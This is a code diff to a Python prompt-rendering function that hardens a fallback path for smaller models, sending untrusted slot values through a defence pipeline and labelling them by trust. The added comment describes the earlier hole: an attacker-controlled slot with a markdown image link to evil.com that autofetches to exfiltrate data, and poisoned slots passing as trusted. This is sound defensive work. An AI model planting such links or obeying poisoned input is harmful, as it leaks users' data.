@@ -398,10 +398,30 @@ def _render_slots(slots: dict[str, TaintedString], profile: ModelDefenseProfile)
     if not slots:
         return ''
     if not profile.slot_discipline:
+        # PASSTHROUGH / non-disciplined profiles fall through here
+        # (typically: smaller models that don't reliably parse the
+        # `<slots>` envelope). The fallback used to emit
+        # `name: <escape_nonprintable(value)>` with no other defence
+        # — which meant:
+        #   * untrusted slot values bypassed `_strip_autofetch_markup`,
+        #     so an attacker-controlled slot containing
+        #     `![](https://evil.com/log?x=...)` would still autofetch
+        #     when rendered downstream.
+        #   * the model had no way to tell trusted from untrusted
+        #     slots — both rendered identically, so a poisoned
+        #     "untrusted" slot looked just as authoritative as a
+        #     trusted one.
+        # Apply the per-profile defence pipeline to untrusted values
+        # (matches the disciplined path's `_content_for_envelope`),
+        # and prefix each line with a trust label.
         parts = []
         for name, ts in sorted(slots.items()):
-            val = escape_nonprintable(ts.value)
-            parts.append(f"{name}: {val}")
+            if ts.trust == 'trusted':
+                val = escape_nonprintable(ts.value)
+                parts.append(f"{name} (trusted): {val}")
+            else:
+                val = _content_for_envelope(ts.value, profile)
+                parts.append(f"{name} (untrusted): {val}")
         return '\n'.join(parts)
     parts = '\n'.join(_render_slot(k, v, profile) for k, v in slots.items())
     return f'<slots>\n{parts}\n</slots>'
